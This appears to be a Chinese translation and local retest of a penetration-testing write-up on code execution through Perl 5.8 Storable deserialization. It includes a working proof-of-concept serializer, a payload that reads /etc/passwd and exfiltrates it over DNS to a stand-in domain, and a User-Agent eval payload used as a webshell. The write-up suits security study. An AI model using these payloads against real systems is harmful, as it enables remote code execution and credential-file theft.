# PERL 5.8的反序列化

**from:**[http://www.agarri.fr/kom/archives/2016/02/06/deserialization_in_perl_v5_8/index.html](http://www.agarri.fr/kom/archives/2016/02/06/deserialization_in_perl_v5_8/index.html)

0x00 文章简单翻译
===========

* * *

在做渗透测试的时候，我发现有个应用程序包含了form表单，其中有一个经过base64编码的hidden属性的参数名叫"state"，包含了一些字符串和二进制数据。

```
$ echo  'BAcIMTIzNDU2NzgECAgIAwMAAAAEAwAAAAAGAAAAcGFyYW1zCIIEAAAAc3RlcAQDAQAAAAiAHgAAAF9fZ2V0X3dvcmtmbG93X2J1c2luZXNzX3BhcmFtcwQAAABkYXRh' | base64 -d | hd 
00000000  04 07 08 31 32 33 34 35  36 37 38 04 08 08 08 03  |...12345678.....|
00000010  03 00 00 00 04 03 00 00  00 00 06 00 00 00 70 61  |..............pa|
00000020  72 61 6d 73 08 82 04 00  00 00 73 74 65 70 04 03  |rams......step..|
00000030  01 00 00 00 08 80 1e 00  00 00 5f 5f 67 65 74 5f  |..........__get_|
00000040  77 6f 72 6b 66 6c 6f 77  5f 62 75 73 69 6e 65 73  |workflow_busines|
00000050  73 5f 70 61 72 61 6d 73  04 00 00 00 64 61 74 61  |s_params....data|

```

我打开了burpsuite的Intruder,做"Character frobber" fuzzing测试。通过返回的结果，我发现了一些有趣的东西。如图1：

![p1](http://drops.javaweb.org/uploads/images/62af64677e3e205b32f4364fe69513e0d85b2996.jpg)

页面返回的结果里暴露了目标使用Perl和Storable 2.7，经过Google搜索，我知道Storable是Perl的一个模块，是用来做数据序列化的。查看Storable的官方文档我们可以看到有个很大的安全提示：

> Some features of Storable can lead to security vulnerabilities if you accept Storable documents from untrusted sources. Most obviously, the optional (off by default) CODE reference serialization feature allows transfer of code to the deserializing process. Furthermore, any serialized object will cause Storable to helpfully load the module corresponding to the class of the object in the deserializing module. For manipulated module names, this can load almost arbitrary code. Finally, the deserialized object's destructors will be invoked when the objects get destroyed in the deserializing process. Maliciously crafted Storable documents may put such objects in the value of a hash key that is overridden by another key/value pair in the same hash, thus causing immediate destructor execution.

有关这个安全问题，youtube上有个叫“ Weaponizing Perl Serialization Flaws with MetaSploit”的视频，作者还把相关代码放在了github([https://github.com/lightsey/cve-2015-1592](https://github.com/lightsey/cve-2015-1592))，有了前人的经验，我想再应用到我的渗透项目里，应该不是太难：），但是经过一些测试后，我发现我不能按照前人的经验来应付我现在的渗透场景，Storable默认使用跨平台的nfreeze()函数来做序列化。例子代码如下：

```
#!/usr/bin/perl

use MIME::Base64 qw( encode_base64 );
use Storable qw( nfreeze );

{
    package foobar;
    sub STORABLE_freeze { return 1; }
}

# Serialize the data
my $data = bless { ignore => 'this' }, 'foobar';
my $frozen = nfreeze($data);

# Encode as Base64+URL and display
$frozen = encode_base64($frozen, '');
$frozen =~ s/\+/%2B/g;
$frozen =~ s/=/%3D/g;
print "$frozen\n";

```

当运行这段代码的时候，报错如下：

```
No STORABLE_thaw defined for objects of class foobar (even after a "require foobar;") at ../../lib/Storable.pm (autosplit into ../../lib/auto/Storable/thaw.al) line 366, at /var/www/cgi-bin/victim line 29
For help, please send mail to the webmaster (support@bigcorp.tld), giving this error message and the time and date of the error.

```

通过报错信息，我认为通过控制"foorbar"字符，尝试注入";"，或许可以注入恶意的Perl代码来运行:D，为了验证我的想法，我通过[https://metacpan.org/source/AMS/Storable-2.51/Storable.xs](https://metacpan.org/source/AMS/Storable-2.51/Storable.xs)查看源码，结果却很失望。

```
if (!Gv_AMG(stash)) {
        const char *package = HvNAME_get(stash);
        TRACEME(("No overloading defined for package %s", package));
        TRACEME(("Going to load module '%s'", package));
        load_module(PERL_LOADMOD_NOIMPORT, newSVpv(package, 0), Nullsv);
        if (!Gv_AMG(stash)) {
                CROAK(("Cannot restore overloading on %s(0x%"UVxf") (package %s) (even after a \"require %s;\")",
                       sv_reftype(sv, FALSE), PTR2UV(sv), package, package));
        }
}

```

通过在Storable.xs源码里搜索“`No STORABLE_thaw defined for objects`”报错信息，定位到了4388行的`load_module(PERL_LOADMOD_NOIMPORT, newSVpv(classname, 0), Nullsv);`这里仅仅调用了`load_module()`,并没有我想要的requrie功能，但是视频里不是这么说的，我又查看了2.15版本的Storable.xs源码[https://metacpan.org/source/AMS/Storable-2.15/Storable.xs](https://metacpan.org/source/AMS/Storable-2.15/Storable.xs)，经过源码对比，发现2.15版的Storable第4297行，多了`perl_eval_sv(psv, G_DISCARD);`

```
4295,4298c4387,4388
<               TRACEME(("Going to require module '%s' with '%s'", classname, SvPVX(psv)));
< 
<               perl_eval_sv(psv, G_DISCARD);
<               sv_free(psv);
---
>               TRACEME(("Going to load module '%s'", classname));
>               load_module(PERL_LOADMOD_NOIMPORT, newSVpv(classname, 0), Nullsv);

```

可以看到，object名(package名后面的字符)直接传入了`perl_eval_sv()`函数。Perl >=5.10以后会使用新的载入机制，所以不受该漏洞影响，而我的目标运行在Perl 5.8，5.8版的Perl在许多老的Linux发行版本(像 RHEL/CentOS 5)是默认安装的，是受此漏洞影响的。这里我只要把我的payload放到object名后面就可以了，我可以载入"POSIX"模块，然后通过`eval()`来运行系统命令。但是这里需要注意的object名的长度是252字节，但也足够我们写payload了。假设我想通过dns来获取返回信息，payload可以这样构造：

```
Socket;use MIME::Base64;sub x{$z=shift;for($i=0;$i<length($z);$i+=45){$x=encode_base64(substr($z,$i,$i+45),'');gethostbyname($x.".dom.tld");}} open(f,"/etc/passwd");while(<f>){x($_)}

```

payload可以构造的很短，比如通过User-Agent来获取命令，然后放入POSIX模块的eval()执行

```
POSIX;eval($ENV{HTTP_USER_AGENT});exit;

```

这里还有一个技巧：如果目标的CGI是不显错的，我可以通过`CGI:Carp的fatalsToBrowser`来把正常输出和报错信息都吐给浏览器，来实现一个简单的webshell。

我这里提供了[http://www.agarri.fr/docs/victim](http://www.agarri.fr/docs/victim)和[http://www.agarri.fr/docs/PoC_thaw_perl58.pl](http://www.agarri.fr/docs/PoC_thaw_perl58.pl)用来做测试练习。

0x01 本地实际测试
===========

* * *

我的测试代码如下：

```
#!/usr/bin/perl

use MIME::Base64 qw( encode_base64 );
use Storable qw( nfreeze );

print Storable->VERSION."\n";

{
    package foobar;POSIX;eval(system("uname"));exit;;;;;
    sub STORABLE_freeze { return 1; }
}

# Serialize the data
my $data = bless { ignore => 'this' }, 'foobar;POSIX;eval(system("uname"));;;;;;;';
my $frozen = nfreeze($data);

print $frozen;

# Encode as Base64+URL and display
$frozen = encode_base64($frozen, '');
$frozen =~ s/\+/%2B/g;
$frozen =~ s/=/%3D/g;
print "BASE64:$frozen\n";

```

如果只是本地测试，可以使用perlbrew来切换perl5.8.9和kali 1.10自带的perl 5.14.2,测试结果如图2所示：

![p2](http://drops.javaweb.org/uploads/images/2f39b461ffe2355c1f4dd24d7f2372d312540254.jpg)

可以看到perl 5.8.9是受漏洞影响的，而perl 5.14.2没有受影响。

接下来在测试下perl cgi,代码就用作者提供的[http://www.agarri.fr/docs/victim](http://www.agarri.fr/docs/victim)，作者提供的POC需要稍微改改，要不然获取不到命令执行结果，测试结果如图3所示：

![p3](http://drops.javaweb.org/uploads/images/85193829a7763dc52cbd1c191f98b6ce8dc88b7e.jpg)

0x02 参考文档：
==========

* * *

*   perl bless 用法实例：[http://blog.chinaunix.net/uid-28246152-id-3399154.html](http://blog.chinaunix.net/uid-28246152-id-3399154.html)
*   Weaponizing Perl Serialization Flaws with MetaSploit：[https://www.youtube.com/watch?v=Gzx6KlqiIZE](https://www.youtube.com/watch?v=Gzx6KlqiIZE)
*   The Storable security problem：[http://www.masteringperl.org/2012/12/the-storable-security-problem/](http://www.masteringperl.org/2012/12/the-storable-security-problem/)
*   Perl多版本共存之Perlbrew：[http://ju.outofmemory.cn/entry/138392](http://ju.outofmemory.cn/entry/138392)

感谢的人：  
多年来一直辅导我的月总